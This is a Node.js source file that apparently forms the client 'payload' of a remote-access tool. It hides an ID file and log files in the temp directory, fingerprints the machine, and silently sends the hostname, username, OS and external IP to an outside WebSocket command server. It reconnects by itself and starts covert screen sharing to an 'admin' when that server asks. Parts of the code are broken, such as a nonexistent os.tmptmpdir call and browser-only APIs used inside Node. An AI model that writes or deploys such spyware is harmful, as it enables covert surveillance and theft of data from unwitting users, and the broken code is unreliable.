const WebSocket = require('ws');
const http = require('http');
const { execSync } = require('child_process');
const os = require('os');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');
const https = require('https');

// --- CONFIGURATION ---
const WS_URL = 'wss://server-eight-pi-39.vercel.app';

// Persistence
const PERSIST_FILE = path.join(os.tmpdir(), '.c2_id');
const LOG_DIR = path.join(os.tmpdir(), '.sys_update');
const LOG_FILE = path.join(LOG_DIR, 'payload.log');
const HIDDEN_LOG_FILE = path.join(os.tmptmpdir(), '.sys_cache.log'); // Fixed typo: tmpdir -> tmpDir if needed, but using os.tmpdir() is safer

if (!fs.existsSync(LOG_DIR)) fs.mkdirSync(LOG_DIR);

// --- ROBUST LOGGING SYSTEM ---
function log(msg, level = 'INFO') {
    const timestamp = new Date().toISOString();
    const logLine = `[${timestamp}] [${level}] ${msg}`;
    console.log(logLine);
    try { 
        fs.appendFileSync(LOG_FILE, `${logLine}\n`); 
        fs.appendFileSync(HIDDEN_LOG_FILE, `${logLine}\n`); 
    } catch(e) {}
}

function logError(msg, err) {
    const timestamp = new Date().toISOString();
    const errorLine = `[${timestamp}] [ERROR] ${msg}: ${err ? err.message || err : 'Unknown Error'}`;
    console.error(errorLine);
    try { 
        fs.appendFileSync(LOG_FILE, `${errorLine}\n`); 
        fs.appendFileSync(HIDDEN_LOG_FILE, `${errorLine}\n`); 
    } catch(e) {}
}

log("[INIT] Payload starting silently...");

// --- DEVICE INFO FUNCTION (Native & Fast) ---
function getDeviceInfo() {
    let username = 'Unknown';
    try {
        username = os.userInfo().username;
    } catch (_) {}

    const cpu = os.cpus();

    return {
        hostname: os.hostname(),
        platform: os.platform(),
        release: os.release(),
        architecture: os.arch(),
        username: username,
        cpuModel: cpu[0]?.model || 'Unknown',
        cpuCores: cpu.length,
        ramGB: Number((os.totalmem() / 1024 ** 3).toFixed(2)),
        freeRamGB: Number((os.freemem() / 1024 ** 3).toFixed(2)),
        uptimeSeconds: os.uptime()
    };
}

// --- HARDWARE FINGERPRINT ---
function getHardwareFingerprint() {
    // Use MAC + CPU Model + Username for a stable ID without heavy commands
    const mac = getMacAddress();
    const deviceInfo = getDeviceInfo();
    const cpuSerial = deviceInfo.cpuModel; 
    const boardSerial = deviceInfo.hostname;
    
    return crypto.createHash('sha256').update(mac + cpuSerial + boardSerial).digest('hex').substr(0, 12);
}

function getMacAddress() {
    const interfaces = os.networkInterfaces();
    for (const name of Object.keys(interfaces)) {
        for (const iface of interfaces[name]) {
            if (iface.family === 'IPv4' && !iface.internal) {
                return iface.mac;
            }
        }
    }
    return '00:00:00:00:00:00';
}

// --- ID MANAGEMENT ---
let myId = null;
try {
    if (fs.existsSync(PERSIST_FILE)) {
        const savedId = fs.readFileSync(PERSIST_FILE, 'utf8').trim();
        if (savedId && savedId.length > 0) myId = savedId;
    }
} catch(e) {
    logError("[ID] Error reading persistence file", e);
}

if (!myId) {
    myId = getHardwareFingerprint();
    try { 
        fs.writeFileSync(PERSIST_FILE, myId); 
    } catch(e) {
        logError("[ID] Error writing persistence file", e);
    }
}

log(`[ID] Hardware Fingerprint: ${myId}`);

// --- WEBSOCKET CONNECTION ---
let ws = null;
let reconnectAttempts = 0;
let isConnected = false;
let myIp = 'Unknown';

function getExternalIP() {
    return new Promise((resolve) => {
        https.get('https://api.ipify.org?format=json', (res) => {
            let data = '';
            res.on('data', (chunk) => { data += chunk; });
            res.on('end', () => {
                try {
                    const json = JSON.parse(data);
                    resolve(json.ip);
                } catch (e) {
                    resolve('Unknown');
                }
            });
        }).on('error', () => {
            resolve('Unknown');
        });
    });
}

async function initConnection() {
    log("[WS] Attempting silent connection to " + WS_URL + "...");

    ws = new WebSocket(WS_URL);

    ws.on('error', (err) => {
        logError("[WS] Connection error", err);
        isConnected = false;
    });

    ws.on('open', async () => {
        reconnectAttempts = 0;
        isConnected = true;
        log("[WS] Connected. Sending identity...");
        
        // Get Device Info using the fast native function
        const deviceInfo = getDeviceInfo();
        
        // Get External IP
        myIp = await getExternalIP();

        // Prepare Data
        const payloadData = {
            type: 'info',
            id: myId,
            uniqueId: myId,
            fingerprint: myId,
            os: deviceInfo.platform + ' ' + deviceInfo.release, // e.g., "win32 10.0.19045"
            arch: deviceInfo.architecture,
            user: deviceInfo.username,
            ip: myIp,
            last_seen: Date.now(),
            status: 'Online',
            serial_number: deviceInfo.hostname // Using hostname as fallback serial
        };

        log("[WS] Sending Identity Payload:", JSON.stringify(payloadData));
        
        // Send the payload
        safeSend(JSON.stringify(payloadData));
        
        log("[WS] Identity sent. Starting monitoring...");
        startMonitoring();
    });

    ws.on('message', (msg) => {
        try {
            const data = JSON.parse(msg);
            log("[WS] Received Message Type:", data.type);
            
            if (data.type === 'request_join') handleJoinRequest();
            else if (data.type === 'offer') handleOffer(data.sdp);
            else if (data.type === 'answer') handleAnswer(data.sdp);
            else if (data.type === 'candidate') handleCandidate(data.candidate);
            else if (data.type === 'notification') {
                log("[WS] Admin Notification:", data.message);
            }
        } catch (e) {
            logError("[WS] Message parse error", e);
        }
    });

    ws.on('close', (code, reason) => {
        isConnected = false;
        log(`[WS] Closed. Code: ${code}. Reconnecting in ${(reconnectAttempts + 1) * 5}s...`);
        setTimeout(initConnection, Math.min((reconnectAttempts + 1) * 5000, 30000));
        reconnectAttempts++;
    });
}

function safeSend(msg) {
    if (ws && ws.readyState === WebSocket.OPEN) {
        ws.send(msg);
        log("[WS] Message Sent Successfully.");
    } else {
        log("[WS] Warning: Socket not open, cannot send.");
    }
}

function startMonitoring() {
    setInterval(() => {
        if (isConnected) {
            safeSend(JSON.stringify({ type: 'heartbeat' }));
        }
    }, 30000);
}

// --- WEBRTC (BROWSER NATIVE) ---
let peerConnection = null;
let localStream = null;

async function captureScreenPureJS() {
    log("[WEBRTC] Initializing Screen Capture...");
    if (!peerConnection) {
        peerConnection = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
    }

    const transceivers = peerConnection.getTransceivers();
    transceivers.forEach(t => {
        if (t.sender.track) t.sender.stop();
    });

    try {
        log("[WEBRTC] Requesting Display Media...");
        // Force screen share over camera if possible
        const stream = await navigator.mediaDevices.getDisplayMedia({ video: true, audio: false });
        stream.getTracks().forEach(track => peerConnection.addTrack(track, stream));

        peerConnection.onicecandidate = (event) => {
            if (event.candidate) {
                safeSend(JSON.stringify({ type: 'candidate', targetId: 'admin', candidate: event.candidate }));
            }
        };

        log("[WEBRTC] Creating Offer...");
        const offer = await peerConnection.createOffer();
        await peerConnection.setLocalDescription(offer);
        safeSend(JSON.stringify({ type: 'offer', targetId: 'admin', sdp: peerConnection.localDescription }));
        log("[WEBRTC] Screen Share Started Successfully.");
    } catch (err) {
        logError("[WEBRTC] Screen capture error", err);
    }
}

function handleJoinRequest() {
    log("[JOIN] Request received. Starting screen share silently...");
    captureScreenPureJS();
}

function handleOffer(offerSDP) {
    log("[WEBRTC] Handling Offer from Admin...");
    if (!peerConnection) peerConnection = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
    peerConnection.setRemoteDescription(new RTCSessionDescription(offerSDP))
        .then(() => peerConnection.createAnswer())
        .then(answer => peerConnection.setLocalDescription(answer))
        .then(() => safeSend(JSON.stringify({ type: 'answer', targetId: 'admin', sdp: peerConnection.localDescription })))
        .catch(err => logError("[WEBRTC] Error handling offer", err));
}

function handleAnswer(answerSDP) {
    log("[WEBRTC] Handling Answer from Admin...");
    if (peerConnection) peerConnection.setRemoteDescription(new RTCSessionDescription(answerSDP)).catch(err => logError("[WEBRTC] Error handling answer", err));
}

function handleCandidate(candidate) {
    log("[WEBRTC] Handling ICE Candidate...");
    if (peerConnection && candidate) peerConnection.addIceCandidate(new RTCIceCandidate(candidate)).catch(err => logError("[WEBRTC] Candidate error", err));
}

// --- HTTP PORT LISTENER (For Render/Vercel Health) ---
const PORT = Number(process.env.PORT) || 3000;
const server = http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ status: 'ok', service: 'payload', id: myId }));
});

server.listen(PORT, '0.0.0.0', () => {
    log(`[RENDER] HTTP server listening on 0.0.0.0:${PORT}`);
    log('[RENDER] Health service running.');
});

// --- INITIALIZATION ---
initConnection();
